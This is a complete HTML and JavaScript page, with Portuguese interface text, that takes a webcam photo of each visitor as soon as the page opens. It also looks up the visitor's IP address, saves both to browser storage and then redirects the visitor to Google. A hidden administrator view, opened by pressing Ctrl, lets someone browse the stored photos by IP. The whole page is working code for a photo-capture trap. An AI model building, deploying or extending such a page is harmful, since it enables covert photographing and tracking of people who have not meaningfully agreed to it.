<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captura de Foto Automática / Modo Administrador</title>
    <style>
        /* (Estilos permanecem os mesmos) */
        body { font-family: Arial, sans-serif; padding: 20px; background-color: #222; color: #eee; }
        h1 { color: #4CAF50; }
        #app-container { max-width: 800px; margin: 0 auto; }
        #capture-view { text-align: center; padding-top: 50px; }
        #admin-view { display: none; }
        #history-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        #history-table th, #history-table td { border: 1px solid #444; padding: 10px; text-align: left; }
        #history-table th { background-color: #333; cursor: pointer; }
        #history-table tr:hover { background-color: #555; }
        .active-row { background-color: #007bff !important; color: white; }
        #photo-display { margin-top: 40px; text-align: center; }
        #photo-display img { max-width: 100%; border: 3px solid #ccc; display: none; }
        #status-message { color: yellow; font-weight: bold; margin-bottom: 10px; }
        #redirect-timer { font-size: 1.2em; color: orange; }
    </style>
</head>
<body>

    <div id="app-container">
        <div id="capture-view">
            <h1>📸 Capturando Imagem...</h1>
            <p id="status-message">Aguarde, você será redirecionado em <span id="redirect-timer">5</span> segundos.</p>
            <p>Dica de Administrador: Pressione **Ctrl** para acessar o histórico.</p>
        </div>

        <div id="admin-view">
            <h1>🔒 Modo Administrador - Histórico Local</h1>
            <p>As fotos abaixo foram salvas **neste navegador** (Local Storage).</p>
            
            <div id="photo-display">
                <h2>📷 Foto Selecionada</h2>
                <p id="selected-ip-text">Clique em uma linha para ver a foto.</p>
                <img id="selected-photo" src="" alt="Foto Capturada">
            </div>

            <table id="history-table">
                <thead>
                    <tr>
                        <th>Endereço IP (Clique para Ver)</th>
                        <th>Hora da Captura (Local)</th>
                    </tr>
                </thead>
                <tbody>
                    </tbody>
            </table>
        </div>
    </div>
    
    <video id="webcam-video" autoplay playsinline muted style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // ==========================================================
        // VARIÁVEIS E CONSTANTES
        // ==========================================================
        const REDIRECT_URL = 'https://www.google.com';
        const STORAGE_KEY = 'photoHistory';
        const REDIRECT_TIME_SECONDS = 5;
        
        const video = document.getElementById('webcam-video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const captureView = document.getElementById('capture-view');
        const adminView = document.getElementById('admin-view');
        const redirectTimerSpan = document.getElementById('redirect-timer');
        const tableBody = document.querySelector('#history-table tbody');
        const selectedPhoto = document.getElementById('selected-photo');
        const selectedIpText = document.getElementById('selected-ip-text');

        let photoData = null;
        let userIP = 'IP_NAO_ENCONTRADO';
        let webcamStream = null;
        let redirectTimeoutId = null;
        let historyData = [];
        let isInAdminMode = false; // 🚩 FLAG CRÍTICA para bloquear a captura

        // ==========================================================
        // FUNÇÕES DE PERSISTÊNCIA E ADMIN
        // ==========================================================
        
        function loadHistory() {
            const storedData = localStorage.getItem(STORAGE_KEY);
            if (storedData) {
                historyData = JSON.parse(storedData);
            }
        }
        
        function saveHistory() {
            localStorage.setItem(STORAGE_KEY, JSON.stringify(historyData));
        }

        // 🟢 CORREÇÃO CRÍTICA AQUI: Adicionar o prefixo do Data URI
        function displayPhoto(base64Img) {
            // Se o prefixo não estiver presente, adicione-o para que o navegador exiba a imagem
            if (!base64Img.startsWith('data:')) {
                base64Img = 'data:image/png;base64,' + base64Img;
            }
            selectedPhoto.src = base64Img;
            selectedPhoto.style.display = 'block';
        }

        function renderTable(selectedIndex = -1) {
            tableBody.innerHTML = ''; 
            
            historyData.slice().reverse().forEach((item, index) => {
                const originalIndex = historyData.length - 1 - index; 
                const row = tableBody.insertRow();
                
                row.classList.toggle('active-row', originalIndex === selectedIndex);

                row.insertCell().textContent = item.ip;
                row.insertCell().textContent = new Date(item.timestamp).toLocaleString();
                
                // Evento de clique para mostrar a foto
                row.onclick = () => {
                    document.querySelectorAll('#history-table tr').forEach(r => r.classList.remove('active-row'));
                    row.classList.add('active-row');
                    
                    selectedIpText.textContent = `Foto de: ${item.ip}`;
                    displayPhoto(item.img); // Chama a função corrigida
                };
            });
        }
        
        function enterAdminMode() {
            isInAdminMode = true; // Define a flag para bloquear o fluxo de captura

            if (redirectTimeoutId) {
                clearInterval(redirectTimeoutId); // Cancela o contador/redirecionamento
            }
            if (webcamStream) {
                webcamStream.getTracks().forEach(track => track.stop()); // Para a webcam, se estiver ativa
            }
            
            loadHistory();
            renderTable();

            captureView.style.display = 'none';
            adminView.style.display = 'block';
            console.log("Modo Administrador Ativado!");
        }

        // ==========================================================
        // FLUXO DE CAPTURA
        // ==========================================================

        function fetchUserIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => { userIP = data.ip; })
                .catch(() => { userIP = 'IP_NAO_ENCONTRADO'; });
        }
        
        function startWebcam() {
            return navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
                .then(stream => {
                    webcamStream = stream;
                    video.srcObject = stream;
                    return new Promise(resolve => video.onloadedmetadata = resolve);
                });
        }
        
        function takePhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            // Salva apenas o Base64 sem o cabeçalho 'data:image/png;base64,'
            photoData = canvas.toDataURL('image/png').split(',')[1]; 
        }

        function saveAndRedirect() {
            if (photoData) {
                const newItem = {
                    ip: userIP,
                    img: photoData,
                    timestamp: new Date().toISOString()
                };
                
                loadHistory(); 
                historyData.push(newItem); 
                saveHistory(); 
            }

            // Inicia o contador de 5 segundos
            let timeLeft = REDIRECT_TIME_SECONDS;
            redirectTimerSpan.textContent = timeLeft;

            const countdown = setInterval(() => {
                // Se a flag for TRUE, o modo admin foi ativado pelo keydown.
                if (isInAdminMode) {
                    clearInterval(countdown);
                    return;
                }

                timeLeft--;
                redirectTimerSpan.textContent = timeLeft;

                if (timeLeft <= 0) {
                    clearInterval(countdown);
                    window.location.href = REDIRECT_URL;
                }
            }, 1000);

            redirectTimeoutId = countdown; 
        }

        // ==========================================================
        // INICIALIZAÇÃO E CONTROLE DE TECLAS
        // ==========================================================
        
        // 1. Lógica de controle de teclas (CTRL)
        window.addEventListener('keydown', (e) => {
            if (e.key === 'Control') {
                e.preventDefault(); 
                enterAdminMode();
                // O listener permanece ativo para pegar o Ctrl mesmo durante o countdown
            }
        });

        // 2. Fluxo de inicialização principal
        async function runCaptureFlow() {
            // 🛑 VERIFICAÇÃO CRÍTICA: Se o modo administrador foi ativado pela tecla pressionada no load, PARA TUDO.
            if (isInAdminMode) return; 

            await fetchUserIP();
            
            try {
                await startWebcam();
                takePhoto();
                saveAndRedirect();
                
            } catch (e) {
                console.error("Erro na captura:", e);
                document.getElementById('status-message').textContent = "Falha ao acessar a câmera. Redirecionando...";
                
                setTimeout(() => {
                    if (!isInAdminMode) { // Garante que o Ctrl não foi pressionado nesse meio tempo
                         window.location.href = REDIRECT_URL;
                    }
                }, 2000);
            }
        }
        
        window.onload = runCaptureFlow;
    </script>
</body>
</html>
